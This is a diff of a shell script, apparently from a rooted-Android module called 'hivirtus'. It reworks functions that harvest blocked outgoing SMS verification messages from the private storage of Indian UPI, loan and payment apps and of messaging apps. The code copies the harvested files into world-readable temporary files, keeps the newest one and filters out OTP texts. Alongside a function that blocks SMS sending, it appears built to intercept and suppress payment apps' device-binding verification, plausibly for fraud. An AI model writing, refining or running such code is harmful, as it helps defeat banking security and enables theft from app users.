@@ -481,7 +481,55 @@ enforce_sms_block() {
 restore_sms_permission
 
 # Promote blocked JSON from app code_cache / module dir → tmp (A16 app can't write tmp)
+# NEVER promote OTP / package junk (stuck last_outgoing bug)
+is_valid_outgoing_json() {
+  local f="$1"
+  [ -f "$f" ] && [ -s "$f" ] || return 1
+  grep -qiE 'is your OTP|<#>|Valid for|Do not share with anyone' "$f" 2>/dev/null && return 1
+  grep -qE '"body"[[:space:]]*:[[:space:]]*"com\.|"body"[[:space:]]*:[[:space:]]*"android\.' "$f" 2>/dev/null && return 1
+  grep -qi 'apps\.messaging' "$f" 2>/dev/null && return 1
+  # Must have a digit dest that is not all zeros
+  local dest
+  dest=$(grep -o '"dest"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+  local digits
+  digits=$(printf '%s' "$dest" | tr -cd '0-9')
+  [ ${#digits} -ge 4 ] && [ ${#digits} -le 15 ] || return 1
+  case "$digits" in *[!0]*) ;; *) return 1 ;; esac
+  local body
+  body=$(grep -o '"body"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+  [ ${#body} -ge 4 ] || return 1
+  return 0
+}
+
+purge_junk_outgoing_files() {
+  for f in /data/local/tmp/hivirtus_last_outgoing.json \
+           /data/local/tmp/hivirtus_pending_verify.json \
+           /data/local/tmp/hivirtus_outgoing_blocked.json; do
+    [ -f "$f" ] || continue
+    is_valid_outgoing_json "$f" && continue
+    echo '{"dest":"","body":"","note":"waiting_for_outgoing_verify"}' > "$f" 2>/dev/null
+    chmod 666 "$f" 2>/dev/null
+  done
+  # Wipe stale Messages OTP captures so harvest can't resurrect them
+  for pkg in com.google.android.apps.messaging com.samsung.android.messaging \
+             com.android.messaging com.motorola.messaging com.android.mms; do
+    for f in \
+      "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_pending_verify.json" \
+      "/data/data/$pkg/code_cache/hivirtus/hivirtus_pending_verify.json" \
+      "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
+      "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json"
+    do
+      [ -f "$f" ] || continue
+      is_valid_outgoing_json "$f" && continue
+      rm -f "$f" 2>/dev/null
+    done
+  done
+}
+
 harvest_blocked_outgoing() {
+  purge_junk_outgoing_files
+  local best="" best_mt=0
+  # Prefer UPI apps over Messages — Messages OTP junk was overwriting forever
   for pkg in com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
              com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
              com.myairtelapp com.yespay.next com.kreditbee.android com.stashfin.android \
@@ -491,39 +539,41 @@ harvest_blocked_outgoing() {
     for f in \
       "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
       "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
-      "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" \
-      "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" \
       "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_pending_verify.json" \
       "/data/data/$pkg/code_cache/hivirtus/hivirtus_pending_verify.json"
     do
-      [ -f "$f" ] && [ -s "$f" ] || continue
+      is_valid_outgoing_json "$f" || continue
+      mt=$(stat -c %Y "$f" 2>/dev/null || echo 0)
+      if [ -z "$best" ] || [ "$mt" -gt "$best_mt" ]; then
+        best="$f"
+        best_mt="$mt"
+      fi
       bn=$(basename "$f")
       cp -f "$f" "/data/local/tmp/$bn" 2>/dev/null
       chmod 666 "/data/local/tmp/$bn" 2>/dev/null
-      # Keep permanent last copy (never deleted by TG)
-      case "$bn" in
-        *outgoing_blocked.json|*pending_verify.json)
-          cp -f "$f" /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
-          chmod 666 /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
-          ;;
-        *outgoing_blocked.flag)
-          cp -f "$f" /data/local/tmp/hivirtus_last_outgoing.flag 2>/dev/null
-          chmod 666 /data/local/tmp/hivirtus_last_outgoing.flag 2>/dev/null
-          ;;
-      esac
+    done
+    for f in \
+      "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" \
+      "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag"
+    do
+      [ -f "$f" ] && [ -s "$f" ] || continue
+      grep -qiE 'is your OTP|<#>|Valid for' "$f" 2>/dev/null && { rm -f "$f"; continue; }
+      cp -f "$f" /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null
+      chmod 666 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null
     done
   done
-  for f in "$MODDIR/hivirtus_outgoing_blocked.json" "$MODDIR/hivirtus_outgoing_blocked.flag" \
-           "$MODDIR/outgoing_blocked.json" "$MODDIR/hivirtus_pending_verify.json"; do
-    [ -f "$f" ] && [ -s "$f" ] || continue
+  if [ -n "$best" ]; then
+    cp -f "$best" /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
+    chmod 666 /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
+  fi
+  for f in "$MODDIR/hivirtus_outgoing_blocked.json" "$MODDIR/outgoing_blocked.json" \
+           "$MODDIR/hivirtus_pending_verify.json"; do
+    is_valid_outgoing_json "$f" || continue
     case "$f" in
       *pending*) cp -f "$f" /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null ;;
       *.json) cp -f "$f" /data/local/tmp/hivirtus_outgoing_blocked.json 2>/dev/null ;;
-      *.flag) cp -f "$f" /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null ;;
     esac
-    chmod 666 /data/local/tmp/hivirtus_outgoing_blocked.json /data/local/tmp/hivirtus_outgoing_blocked.flag \
-      /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null
-    cp -f /data/local/tmp/hivirtus_outgoing_blocked.json /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
+    cp -f "$f" /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
     chmod 666 /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
   done
 }
